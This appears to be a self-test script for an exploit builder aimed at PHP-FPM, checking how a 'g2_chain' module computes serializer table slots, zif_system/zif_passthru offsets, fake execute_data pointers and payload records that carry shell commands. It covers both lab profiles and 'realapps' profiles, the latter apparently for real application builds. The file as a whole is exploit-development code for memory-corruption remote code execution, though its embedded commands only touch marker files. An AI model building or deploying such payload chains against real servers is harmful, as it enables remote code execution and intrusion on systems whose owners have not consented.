#!/usr/bin/env python3
"""Self-checks for the four builder fixes on the isolated clone."""
import copy
import hashlib
import json
import struct
import sys
from pathlib import Path

ROOT = Path("/tmp/opencode/buildfix_20261022T023939Z/applycheck")
sys.path.insert(0, str(ROOT))
from tool.modules import g2_chain as g  # noqa: E402

FAILED = []


def check(name, cond, detail=""):
    status = "PASS" if cond else "FAIL"
    print(f"{status} {name}" + (f" :: {detail}" if detail else ""))
    if not cond:
        FAILED.append(name)


def load(name):
    return json.loads((ROOT / "addresses" / name).read_text())


LAB = load("g2_fpm_8510.json")
REAL = load("g2_fpm_realapps_8510.json")
X = 0x7FFFF7A6A000
X2 = 0x7FFFF7AAE000
P = 0x7FFFF7A81000
B0 = 0x7FFFF7A84000
TOTAL = 131014

# --- fix 2: entry-name -> real table slot ----------------------------------
for name in ("g2_fpm_8510.json", "g2_fpm_8425.json",
             "g2_fpm_8134.json", "g2_fpm_7433.json",
             "g2_fpm_realapps_8510.json"):
    profile = load(name)
    table = profile["ps_serializers"]
    for entry_name in ("php", "php_binary"):
        entry = g._serializer_entry(profile, entry_name)
        expected = (int(table["table"], 16)
                    + entry["index"] * profile["structs"]["ps_serializer_size"]
                    + 0x10)
        check(f"{name}: {entry_name} slot",
              int(entry["decode"], 16) == expected,
              f"index {entry['index']} decode {entry['decode']}")

php = g._serializer_entry(REAL, "php")
php_binary = g._serializer_entry(REAL, "php_binary")
check("realapps php slot is entry 1", php["index"] == 1 and php["decode"] == "0x22c54c8")
check("realapps php_binary slot is entry 2",
      php_binary["index"] == 2 and php_binary["decode"] == "0x22c54e0")
check("realapps default_target is the php slot",
      int(REAL["ps_serializers"]["default_target"], 16)
      == int(php["decode"], 16))
check("realapps default_target is not the php_binary slot",
      int(REAL["ps_serializers"]["default_target"], 16)
      != int(php_binary["decode"], 16))
for name in ("g2_fpm_8510.json", "g2_fpm_8425.json",
             "g2_fpm_8134.json", "g2_fpm_7433.json"):
    profile = load(name)
    check(f"{name}: default_target equals php_binary",
          int(profile["ps_serializers"]["default_target"], 16)
          == int(g._serializer_entry(profile, "php_binary")["decode"], 16))

# A profile whose php_binary name is changed must fail, not fall back by index.
broken = copy.deepcopy(LAB)
broken["ps_serializers"]["entries"][2]["name"] = "php_binary_renamed"
try:
    g._serializer_entry(broken, "php_binary")
    check("missing php_binary name is rejected", False)
except ValueError as error:
    check("missing php_binary name is rejected", "0 ps_serializers entries" in str(error),
          str(error))

# --- fix 3: per-profile zif_passthru, no +0x10 synthesis -------------------
for name, expected in (("g2_fpm_8510.json", 0x10),
                       ("g2_fpm_8425.json", 0x10),
                       ("g2_fpm_8134.json", 0x10),
                       ("g2_fpm_7433.json", 0x10),
                       ("g2_fpm_realapps_8510.json", 0x13)):
    profile = load(name)
    check(f"{name}: zif delta", g._zif_delta(profile) == expected,
          f"+0x{g._zif_delta(profile):x}")

no_passthru = copy.deepcopy(LAB)
del no_passthru["zif_passthru"]
try:
    g._zif_symbol(no_passthru, "zif_passthru")
    check("missing zif_passthru is rejected (no +0x10 fallback)", False)
except ValueError as error:
    check("missing zif_passthru is rejected (no +0x10 fallback)",
          "has no zif_passthru address" in str(error), str(error))

bad_delta = copy.deepcopy(LAB)
bad_delta["zif_route"] = {
    "zif_passthru": {"delta_from_zif_system": "+0x13 on this build"}}
try:
    g._zif_delta(bad_delta)
    check("declared delta mismatch is rejected", False)
except ValueError as error:
    check("declared delta mismatch is rejected",
          "disagrees with zif_passthru - zif_system = +0x10" in str(error),
          str(error))

# --- fix 1/2: G2 lab record is byte-identical ------------------------------
g2 = g.plan(x=X, p=P, b0=B0, total=TOTAL,
            command="touch /tmp/fpmgadget_sys;exit;#",
            libc_base=0x7FFFF7C9C000, profile=LAB)
check("G2 target uses php_binary entry", g2["slot"] == "0x14c1b60")
check("G2 used_slots", g2["used_slots"] == -8796082913867)
check("G2 record hash",
      hashlib.sha256(g2["record"]).hexdigest()
      == "373b4bb1dabda7e4417942ef0b1cd75bbe3880f83b4d1b10187cf66708e075e8")

# --- fix 1: lab Q=0x77, F derived from Q ----------------------------------
lab = g.plan_zif(x=X, x2=X2, p=P, b0=B0, total=TOTAL,
                 decode="zif_passthru", profile=LAB,
                 command="touch /tmp/FPM_ZIF")
check("lab Q", lab["geometry"]["payload_start"] == 0x77)
check("lab F", lab["geometry"]["f_addr"] == 0x7FFFF7AAE18F,
      hex(lab["geometry"]["f_addr"]))
check("lab F source", lab["fake_execute_data"]["arg1_value_source"]
      == "X2 + 0x18 + Q(0x77) + 0x100")
check("lab key1 arg1 pointer",
      struct.unpack_from("<Q", lab["record"], 0x50)[0]
      == lab["geometry"]["f_addr"])
check("lab record checks", all(item["ok"] for item in lab["checks"]))

# --- fix 1/2/3: realapps php_binary geometry, Q=0x78 ----------------------
real = copy.deepcopy(REAL)
real["record_builder"] = g.PHP_BINARY_ZIF_BUILDER
# Prove the default target is not used: corrupt it before planning.
real["ps_serializers"]["default_target"] = "0x11111111"
cmd = b"touch /tmp/opencode/research/realzif_20261022T013000Z/PASSTHRU_REAL"
z = g.plan_zif(x=0x7FFFF466A000, x2=0x7FFFF46AE000,
               p=0x7FFFF4681000, b0=0x7FFFF4684000, total=TOTAL,
               decode="zif_passthru", profile=real, command=cmd)
check("realapps target is php_binary slot", z["slot"] == "0x22c54e0",
      z["slot"])
check("realapps target entry", z["target_entry"]
      == {"index": 2, "name": "php_binary"})
check("realapps Q", z["geometry"]["payload_start"] == 0x78)
check("realapps L", z["geometry"]["length"] == 130892)
check("realapps F", z["geometry"]["f_addr"] == 0x7FFFF46AE190,
      hex(z["geometry"]["f_addr"]))
check("realapps F source", z["fake_execute_data"]["arg1_value_source"]
      == "X2 + 0x18 + Q(0x78) + 0x100")
check("realapps key1 arg1 pointer",
      struct.unpack_from("<Q", z["record"], 0x50)[0] == 0x7FFFF46AE190)
check("realapps used_slots K", z["used_slots"] == -8796078587571)
check("realapps zif", z["addresses"]["zif"] == "0xa3c074")
check("realapps delta", z["addresses"]["zif_delta_from_system"] == "0x13")
check("realapps cmd length field",
      struct.unpack_from("<Q", z["record"], 0x78 + 0x110)[0] == len(cmd))
check("realapps command bytes",
      z["record"][0x78 + 0x118:0x78 + 0x118 + len(cmd)] == cmd)
check("realapps record length", len(z["record"]) == TOTAL)
check("realapps record checks", all(item["ok"] for item in z["checks"]))
check("realapps serializer", z["serializer"] == "php_binary")

# --- negative paths --------------------------------------------------------
try:
    g.plan_zif(x=X, x2=X2, p=P, b0=B0, total=TOTAL,
               decode="zif_passthru", profile=REAL)
    check("unmodified realapps profile is rejected", False)
except ValueError as error:
    check("unmodified realapps profile is rejected",
          "record_builder" in str(error) or "session record shape" in str(error),
          str(error))

try:
    g.plan_zif(x=X, x2=None, p=P, b0=B0, total=TOTAL,
               decode="zif_passthru", profile=LAB)
    check("missing X2 is rejected", False)
except ValueError as error:
    check("missing X2 is rejected", "requires --g2-x2" in str(error),
          str(error))

try:
    g.plan_zif(x=0x7FFFF466A000, x2=0x7FFFF46AE000,
               p=0x7FFFF4681000, b0=0x7FFFF4684000, total=TOTAL,
               decode="zif_passthru", profile=real, target=0x22C54C8)
    check("explicit php slot is rejected for the php_binary record", False)
except ValueError as error:
    check("explicit php slot is rejected for the php_binary record",
          "not 16 byte aligned" in str(error), str(error))

print()
if FAILED:
    print(f"FAILED {len(FAILED)}: " + ", ".join(FAILED))
    raise SystemExit(1)
print("ALL CHECKS PASSED")
